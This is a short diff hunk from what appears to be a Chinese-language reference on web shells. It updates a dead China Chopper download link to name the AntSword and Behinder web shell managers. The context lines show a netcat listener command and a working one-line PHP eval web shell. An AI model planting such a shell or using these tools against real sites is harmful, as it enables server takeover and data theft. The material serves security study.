@@ -47,7 +47,7 @@ nc -nvvlp 1234
 <?php @eval($_POST['chopper']);?>
 ```
 
-> 下载地址: [http://www.maicaidao.com/](http://www.maicaidao.com/)（可能无法访问），注意检查下载文件是否被植入后门。
+> 原官网 maicaidao.com 已失效。现代替代工具如 [AntSword](https://github.com/AntSwordProject/antSword)（蚁剑，开源）、[Behinder](https://github.com/rebeyond/Behinder)（冰蝎）等功能更强大。
 
 ## 0x04 WeBaCoo (Web Backdoor Cookie)
 
